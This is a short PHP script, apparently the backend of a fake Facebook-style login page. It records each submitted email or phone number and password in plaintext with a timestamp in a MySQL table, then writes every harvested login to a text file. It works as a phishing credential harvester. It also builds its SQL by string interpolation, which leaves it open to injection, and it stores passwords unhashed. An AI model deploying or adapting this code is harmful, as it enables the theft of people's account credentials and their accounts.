<?php
//ket noi sql
$connect = mysqli_connect('localhost','sqlface','12345678','sqlface');
$tk = $mk = "";
$tkErr = $mkErr = "";
if($_SERVER["REQUEST_METHOD"]=="POST"){
    if(isset($_POST['click']))
    {
        if(empty($_POST['tk']))
        {
            $tkErr = "Vui lòng nhập email hoặc số điện thoại";
        }
        if(empty($_POST['mk']))
        {
            $mkErr = "Vui lòng nhập mật khẩu.";
        }
        $tk = test_input($_POST['tk']);
        $mk = test_input($_POST['mk']);
        date_default_timezone_set('Asia/Ho_Chi_Minh');
        $_date = date("Y-m-d h:i:sa");
        $sql_Insert ="INSERT INTO `accountlogin`(`Account`, `Password`, `Date`) VALUES ('$tk','$mk','$_date')";
        mysqli_query($connect,$sql_Insert);
    }
}

//truy xuat du lieu ra file Txt
$fh = fopen('sqlfaceT.txt', 'w');
$sql_Select = "SELECT * FROM `accountlogin`;";
$result = mysqli_query($connect,$sql_Select);
while ($row = mysqli_fetch_array($result)) {          
    $last = end($row);          
    $num = mysqli_num_fields($result) ;    
    for($i = 0; $i < $num; $i++) {            
        fwrite($fh, $row[$i]);                      
        if ($row[$i] != $last)
           fwrite($fh, ", ");
        }      
        fwrite($fh, "\n");                                                           
        }
    fclose($fh);
mysqli_close($connect);
function test_input($data)
{
    //loai bo ky tu khong can thiet
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}
